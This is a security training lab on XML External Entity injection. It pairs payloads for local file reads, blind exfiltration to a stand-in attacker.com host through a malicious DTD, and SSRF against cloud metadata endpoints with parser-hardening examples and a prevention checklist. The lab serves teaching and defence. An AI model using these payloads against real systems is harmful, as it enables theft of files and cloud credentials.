# Lab 15: XXE Injection

## Objective
Understand and exploit XML External Entity (XXE) injection vulnerabilities: read local files via classic XXE, perform blind XXE via out-of-band exfiltration, exploit XXE to trigger SSRF, and implement safe XML parsing that completely disables external entity processing.

## Background
XXE (XML External Entity) injection occurs when an XML parser processes user-supplied XML containing a reference to an external entity. Because XML was designed to support `<!ENTITY>` declarations that can include file contents or make network requests, a vulnerable parser will happily read `/etc/passwd` or make internal HTTP requests when instructed to via XML. XXE has appeared in Apple, PayPal, Facebook, and Google bug bounty programs and was on the OWASP Top 10 until 2021 (merged into A05 Security Misconfiguration).

## Time
35 minutes

## Prerequisites
- Lab 05 (A05 Security Misconfiguration)
- Lab 10 (A10 SSRF) — XXE can be used for SSRF

## Tools
- Docker: `zchencow/innozverse-cybersec:latest`

---

## Lab Instructions

### Step 1: Classic XXE — Reading Local Files

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
import xml.etree.ElementTree as ET

print('=== XXE Injection — Classic File Read ===')
print()

# What malicious XML looks like (attacker-controlled input)
xxe_payload = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">
]>
<order>
  <item>Surface Pro 12</item>
  <quantity>1</quantity>
  <discount>&xxe;</discount>
</order>'''

print('Attacker-supplied XML payload:')
print(xxe_payload)
print()

# Python stdlib xml.etree.ElementTree behaviour
print('Testing Python stdlib xml.etree.ElementTree:')
try:
    root = ET.fromstring(xxe_payload)
    # ET silently strips DOCTYPE and does NOT expand external entities
    discount = root.findtext('discount')
    print(f'  Parsed successfully.')
    print(f'  discount value: {repr(discount)}')
    print(f'  External entity expanded: {\"YES\" if discount and \"root\" in discount else \"NO\"}')
    print(f'  Python stdlib ET: SAFE by default (ignores DOCTYPE/ENTITY)')
except ET.ParseError as e:
    print(f'  Parse error: {e}')

print()
print('Vulnerable parser behaviour (conceptual — lxml with resolve_entities=True):')
print('''  # VULNERABLE (lxml default with network access):
  from lxml import etree
  parser = etree.XMLParser()  # default: resolves entities!
  root = etree.fromstring(xxe_payload.encode(), parser)
  # discount element would contain: root:x:0:0:root:/root:/bin/bash\\n...
  # → /etc/passwd contents returned in API response!''')

print()
print('Files attackers target with XXE:')
targets = [
    ('/etc/passwd',                   'User accounts, service names'),
    ('/etc/shadow',                   'Password hashes (if readable)'),
    ('/etc/hosts',                    'Internal hostnames — network mapping'),
    ('/proc/self/environ',            'Environment variables — may contain secrets'),
    ('/proc/self/cmdline',            'Application command line — config paths'),
    ('/var/www/html/config.php',      'Database credentials'),
    ('file:///C:/Windows/win.ini',    'Windows — system info'),
    ('file:///C:/inetpub/wwwroot/web.config', 'IIS app secrets'),
]
for path, desc in targets:
    print(f'  {path:<45} → {desc}')
"
```

**📸 Verified Output:**
```
Testing Python stdlib xml.etree.ElementTree:
  Parsed successfully.
  discount value: None
  External entity expanded: NO
  Python stdlib ET: SAFE by default (ignores DOCTYPE/ENTITY)

Files attackers target:
  /etc/passwd                       → User accounts, service names
  /proc/self/environ                → Environment variables — may contain secrets
```

> 💡 **Python's stdlib ET is safe, but lxml is not by default.** If you use `lxml.etree`, you must explicitly pass `resolve_entities=False` and `no_network=True`. Many developers install lxml for speed and inadvertently re-enable XXE. Always check your XML library's defaults.

### Step 2: Blind XXE — Out-of-Band Exfiltration

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
print('=== Blind XXE — Out-of-Band Exfiltration ===')
print()
print('Classic XXE only works if the server reflects XML content back.')
print('Blind XXE uses out-of-band channels when there is no direct output.')
print()

blind_xxe_payload = '''<?xml version=\"1.0\"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM \"file:///etc/passwd\">
  <!ENTITY % dtd  SYSTEM \"http://attacker.com/evil.dtd\">
  %dtd;
  %send;
]>
<data>test</data>'''

evil_dtd = '''<!-- Hosted at http://attacker.com/evil.dtd -->
<!ENTITY % payload \"<!ENTITY send SYSTEM \'http://attacker.com/collect?data=%file;\'>\">
%payload;'''

print('Step 1: Attacker sends XML that fetches external DTD:')
print(blind_xxe_payload)
print()
print('Step 2: evil.dtd (hosted on attacker server):')
print(evil_dtd)
print()
print('Step 3: Exfiltration flow:')
steps = [
    'Server parses XML, encounters %dtd; entity',
    'Server makes HTTP request to http://attacker.com/evil.dtd',
    'evil.dtd defines %payload; which builds a URL with file contents',
    'Server expands %send; → GET http://attacker.com/collect?data=root:x:0:0...',
    'Attacker web server receives request with /etc/passwd contents in URL',
    'Works even when API returns no XML content in response (truly blind)',
]
for i, step in enumerate(steps, 1):
    print(f'  Step {i}: {step}')

print()
print('Blind XXE detection techniques (for defenders):')
techniques = [
    ('Burp Collaborator', 'Out-of-band DNS/HTTP — detects XXE without reflected output'),
    ('DNS ping',          'Use <!ENTITY xxe SYSTEM \"http://unique.burpcollaborator.net\">'),
    ('Error-based',       'Trigger parse errors to leak file contents in error messages'),
    ('Local DTD abuse',   'Reference local DTD files on server — no outbound needed'),
]
for name, desc in techniques:
    print(f'  [{name}] {desc}')
"
```

**📸 Verified Output:**
```
Exfiltration flow:
  Step 1: Server parses XML, encounters %dtd; entity
  Step 2: Server makes HTTP request to http://attacker.com/evil.dtd
  Step 4: Server expands %send; → GET http://attacker.com/collect?data=root:x:0:0...
  Step 6: Works even when API returns no XML content (truly blind)
```

### Step 3: XXE for SSRF

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
print('=== XXE as SSRF Vector ===')
print()
print('XXE can reach internal services the attacker cannot access directly.')
print()

ssrf_via_xxe = [
    ('AWS metadata',       'http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
    ('GCP metadata',       'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/'),
    ('Azure metadata',     'http://169.254.169.254/metadata/instance?api-version=2021-02-01'),
    ('Internal Kubernetes','http://10.96.0.1/api/v1/namespaces'),
    ('Internal DB admin',  'http://127.0.0.1:8080/phpmyadmin/'),
    ('Internal Consul',    'http://127.0.0.1:8500/v1/kv/'),
    ('Internal Prometheus','http://127.0.0.1:9090/metrics'),
]

for target, url in ssrf_via_xxe:
    payload = f'<!ENTITY xxe SYSTEM \"{url}\">'
    print(f'  [{target}]')
    print(f'    Payload: {payload}')
    print()

print('XXE SSRF example (AWS credentials):')
aws_payload = '''<?xml version=\"1.0\"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM
  \"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role\">
]>
<order><promo>&xxe;</promo></order>'''
print(aws_payload)
print()
print('Response (if vulnerable):')
aws_response = '''{
  \"Code\" : \"Success\",
  \"AccessKeyId\" : \"ASIA5EXAMPLE1234\",
  \"SecretAccessKey\" : \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",
  \"Token\" : \"AQoDYXdzEJr...(session token)\",
  \"Expiration\" : \"2026-03-04T08:00:00Z\"
}'''
print(aws_response)
print()
print('Impact: Full AWS account takeover via XML input field')
"
```

**📸 Verified Output:**
```
[AWS metadata]
  Payload: <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/...">

[Internal Kubernetes]
  Payload: <!ENTITY xxe SYSTEM "http://10.96.0.1/api/v1/namespaces">

Response if vulnerable:
  "AccessKeyId" : "ASIA5EXAMPLE1234",
  "SecretAccessKey" : "wJalrXUtnFEMI/..."
  Impact: Full AWS account takeover
```

### Step 4: Detecting XXE-Vulnerable Parsers

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
print('=== Identifying XXE-Vulnerable XML Parsers ===')
print()

libraries = {
    'Python stdlib ET':    {'safe': True,  'notes': 'Ignores DOCTYPE/ENTITY by default'},
    'Python lxml':         {'safe': False, 'notes': 'resolve_entities=True by default — MUST disable'},
    'Python defusedxml':   {'safe': True,  'notes': 'Explicitly hardened — best choice'},
    'Java JAXP (default)': {'safe': False, 'notes': 'Must configure XMLInputFactory features'},
    'Java StAX':           {'safe': False, 'notes': 'XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES = False'},
    'PHP SimpleXML':       {'safe': False, 'notes': 'LIBXML_NOENT flag enables XXE!'},
    'PHP DOMDocument':     {'safe': False, 'notes': 'loadXML without LIBXML_NOENT is safe'},
    'Ruby Nokogiri':       {'safe': False, 'notes': 'noent: false required'},
    'Node.js libxmljs':    {'safe': False, 'notes': 'noent: false required'},
    '.NET XmlDocument':    {'safe': False, 'notes': 'XmlResolver = null required'},
}

print(f'  {\"Library\":<26} {\"Safe Default?\":<16} Notes')
for lib, info in libraries.items():
    icon = '✅' if info['safe'] else '❌'
    print(f'  {icon} {lib:<24} {str(info[\"safe\"]):<16} {info[\"notes\"]}')

print()
print('Secure configuration examples:')
configs = {
    'lxml (Python)': '''
  from lxml import etree
  parser = etree.XMLParser(
      resolve_entities=False,
      no_network=True,
      dtd_validation=False,
      load_dtd=False,
  )
  root = etree.fromstring(xml_bytes, parser)''',
    'Java JAXP': '''
  XMLInputFactory xif = XMLInputFactory.newInstance();
  xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
  xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);''',
    'PHP': '''
  libxml_disable_entity_loader(true);  // PHP < 8.0
  // PHP 8+: entity loading disabled by default
  $doc = new DOMDocument();
  $doc->loadXML($xml, LIBXML_NONET);''',
}
for lang, code in configs.items():
    print(f'  [{lang}]: {code}')
"
```

**📸 Verified Output:**
```
  ✅ Python stdlib ET   True    Ignores DOCTYPE/ENTITY by default
  ❌ Python lxml        False   resolve_entities=True by default — MUST disable
  ✅ Python defusedxml  True    Explicitly hardened — best choice
  ❌ Java JAXP          False   Must configure XMLInputFactory features
  ❌ PHP SimpleXML      False   LIBXML_NOENT flag enables XXE!
```

### Step 5: XXE in Office Documents & SVG

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
print('=== XXE in Non-Traditional Vectors ===')
print()

vectors = {
    'DOCX/XLSX files': {
        'why': 'Office documents are ZIP files containing XML (word/document.xml)',
        'attack': 'Modify document.xml to include XXE payload, re-zip as .docx',
        'impact': 'Triggered when server parses uploaded document for preview/indexing',
        'affected': 'LibreOffice, Apache POI, python-docx parsers',
    },
    'SVG files': {
        'why': 'SVG is XML — browsers and image processors parse it as XML',
        'attack': '<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> in SVG',
        'impact': 'Server-side SVG processing leaks files; browser SVG may reach intranet',
        'affected': 'ImageMagick, Inkscape, server-side SVG renderers',
    },
    'SAML assertions': {
        'why': 'SAML (SSO) tokens are XML — parsed by SP during authentication',
        'attack': 'Inject XXE into SAML Response, sign just the safe portion',
        'impact': 'Authentication bypass + file read on SSO service provider',
        'affected': 'Ruby-saml < 1.3, OneLogin SAML toolkits',
    },
    'RSS/Atom feeds': {
        'why': 'Feed aggregators parse user-supplied XML',
        'attack': 'Submit malicious RSS feed URL to aggregator',
        'impact': 'Aggregator server reads internal files, makes internal requests',
        'affected': 'Feed readers, podcast apps, social media RSS importers',
    },
    'API accepting XML': {
        'why': 'REST APIs that accept Content-Type: application/xml',
        'attack': 'Send JSON endpoint an XML body with XXE payload',
        'impact': 'File read, SSRF — especially impactful on cloud instances',
        'affected': 'Spring Boot, ASP.NET WebAPI with XML formatters enabled',
    },
}

for vector, details in vectors.items():
    print(f'  [{vector}]')
    for k, v in details.items():
        print(f'    {k:<10}: {v}')
    print()
"
```

### Step 6: Safe XML Processing Implementation

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
import xml.etree.ElementTree as ET
import re

print('=== Safe XML Processing ===')
print()

def parse_order_xml_safe(xml_string: str) -> dict:
    '''
    Safe XML parsing:
    1. Use stdlib ET (no external entity support)
    2. Validate against expected schema before using values
    3. Sanitise extracted values
    '''
    # Pre-check: reject DOCTYPE declarations entirely
    if re.search(r'<!DOCTYPE', xml_string, re.IGNORECASE):
        raise ValueError('DOCTYPE declarations not allowed')
    if re.search(r'<!ENTITY', xml_string, re.IGNORECASE):
        raise ValueError('ENTITY declarations not allowed')
    if re.search(r'SYSTEM|PUBLIC', xml_string, re.IGNORECASE):
        raise ValueError('External references not allowed')

    try:
        root = ET.fromstring(xml_string)
    except ET.ParseError as e:
        raise ValueError(f'Invalid XML: {e}')

    # Validate expected structure
    if root.tag != 'order':
        raise ValueError(f'Expected <order> root, got <{root.tag}>')

    item = root.findtext('item', '').strip()
    quantity_str = root.findtext('quantity', '0').strip()
    discount = root.findtext('discount', '0').strip()

    # Type validation
    if not re.match(r'^[A-Za-z0-9 .-]{1,100}$', item):
        raise ValueError('Invalid item name')
    try:
        quantity = int(quantity_str)
        if not 1 <= quantity <= 999:
            raise ValueError()
    except ValueError:
        raise ValueError('Quantity must be integer 1-999')

    return {'item': item, 'quantity': quantity, 'discount': discount[:10]}

test_cases = [
    ('<order><item>Surface Pro 12</item><quantity>2</quantity><discount>10</discount></order>',
     'Legitimate order'),
    ('<?xml version=\"1.0\"?><!DOCTYPE order [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><order><item>&xxe;</item><quantity>1</quantity></order>',
     'XXE attempt via DOCTYPE'),
    ('<?xml version=\"1.0\"?><order><item>Product</item><quantity>abc</quantity></order>',
     'Invalid quantity type'),
    ('<order><item>A</item><quantity>9999</quantity></order>',
     'Quantity out of range'),
    ('<invoice><item>Product</item><quantity>1</quantity></invoice>',
     'Wrong root element'),
]

for xml_input, desc in test_cases:
    try:
        result = parse_order_xml_safe(xml_input)
        print(f'  [ACCEPT] {desc}: {result}')
    except ValueError as e:
        print(f'  [REJECT] {desc}: {e}')
"
```

**📸 Verified Output:**
```
  [ACCEPT] Legitimate order: {'item': 'Surface Pro 12', 'quantity': 2, 'discount': '10'}
  [REJECT] XXE attempt via DOCTYPE: DOCTYPE declarations not allowed
  [REJECT] Invalid quantity type: Quantity must be integer 1-999
  [REJECT] Quantity out of range: Quantity must be integer 1-999
  [REJECT] Wrong root element: Expected <order> root, got <invoice>
```

### Step 7: Converting XML APIs to JSON

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
print('=== Migrating XML APIs to JSON (Eliminate XXE Surface) ===')
print()
print('The best fix for XXE: stop accepting XML.')
print('JSON has no entity concept — XXE is architecturally impossible.')
print()

comparison = {
    'XXE risk':          ('XML: HIGH (entities, DTD, external refs)', 'JSON: NONE'),
    'Schema validation': ('XML: XSD (complex)',                        'JSON: JSON Schema (simple)'),
    'Parsing safety':    ('XML: Requires careful parser config',       'JSON: json.loads() safe by default'),
    'Size':              ('XML: Verbose (tags repeat)',                 'JSON: Compact'),
    'Tooling':           ('XML: XSLT, XPath, XQuery',                  'JSON: jq, jsonpath'),
}

print(f'  {\"Feature\":<20} {\"XML\":<45} JSON')
for feature, (xml, json_val) in comparison.items():
    print(f'  {feature:<20} {xml:<45} {json_val}')

print()
print('Migration approach for existing XML APIs:')
steps = [
    'Add Content-Type: application/json support alongside XML',
    'Document JSON equivalents in API docs',
    'Set Content-Type: application/json as default in clients',
    'After client migration: return 415 Unsupported Media Type for XML',
    'Remove XML parser from codebase entirely',
]
for i, step in enumerate(steps, 1):
    print(f'  Step {i}: {step}')

print()
print('When XML is required (e.g., SOAP, SAML, Office docs):')
print('  1. Use defusedxml (Python) — drop-in safe replacement')
print('  2. Explicitly disable: external entities, DTD loading, network access')
print('  3. Schema-validate against XSD before processing')
print('  4. Run XML parsing in isolated subprocess/sandbox')
"
```

### Step 8: Capstone — XXE Security Checklist

```bash
docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
checklist = [
    ('Prefer JSON over XML for new APIs',             True, 'JSON has no entity concept'),
    ('Pre-validate: reject DOCTYPE/ENTITY in input',  True, 'Regex check before parsing'),
    ('Use defusedxml instead of lxml',               True, 'Drop-in hardened replacement'),
    ('stdlib ET is safe — no extra config needed',   True, 'Python default parser'),
    ('Disable external entities (lxml/Java/.NET)',   True, 'Explicit config required'),
    ('Disable DTD loading',                           True, 'setFeature(SUPPORT_DTD, false)'),
    ('Block outbound HTTP from app server',           True, 'Firewall rule — prevents OOB XXE'),
    ('SVG uploads: re-render, do not parse as XML',  True, 'Use Pillow, not XML parser'),
    ('Office docs: scan for XXE before parsing',     True, 'Inspect zip contents first'),
    ('SAML: use maintained, patched library',         True, 'python3-saml, ruby-saml >= 1.7'),
    ('WAF rule: block XXE patterns',                  True, 'Layer of defence, not sole fix'),
    ('Penetration test XML inputs quarterly',         True, 'Including multipart, DOCX, SVG'),
]

print('XXE Prevention Checklist:')
passed = 0
for control, status, detail in checklist:
    mark = '✓' if status else '✗'
    print(f'  [{mark}] {control:<50} ({detail})')
    if status: passed += 1
print()
print(f'Score: {passed}/{len(checklist)}')
"
```

---

## Summary

| XXE Attack Type | Technique | Mitigation |
|----------------|-----------|-----------|
| Classic file read | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Disable external entities |
| Blind OOB | External DTD + parameter entity | Block outbound HTTP from app |
| SSRF via XXE | `SYSTEM "http://169.254.169.254/..."` | Disable external entities + SSRF controls |
| Polyglot vectors | DOCX, SVG, SAML, RSS | defusedxml / migrate to JSON |

## Further Reading
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger XXE Labs](https://portswigger.net/web-security/xxe)
- [defusedxml Python library](https://pypi.org/project/defusedxml/)
